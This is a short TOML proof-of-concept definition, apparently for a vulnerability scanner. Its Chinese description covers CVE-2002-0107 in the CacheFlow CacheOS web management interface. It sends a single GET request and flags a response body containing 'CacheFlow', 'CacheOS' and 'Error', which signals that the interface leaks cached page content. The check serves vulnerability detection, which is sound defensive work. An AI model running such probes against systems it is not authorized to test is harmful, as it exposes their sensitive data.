[info]
author = "AVE"
description = "检测CacheFlow CacheOS Web管理界面信息泄露漏洞。通过发送不以HTTP/1.0结尾的GET请求，触发错误消息泄露缓存页面代码等敏感信息。"
id = "POC-AVE-2002-0165"
name = "CacheFlow CacheOS Web管理界面敏感信息泄漏漏洞 PoC"
severity = "medium"
tags = ["cve-2002-0107"]
vuln_id = [
    "CVE-2002-0107",
    "AVE-2002-0165",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "CacheFlow",
    "CacheOS",
    "Error",
]
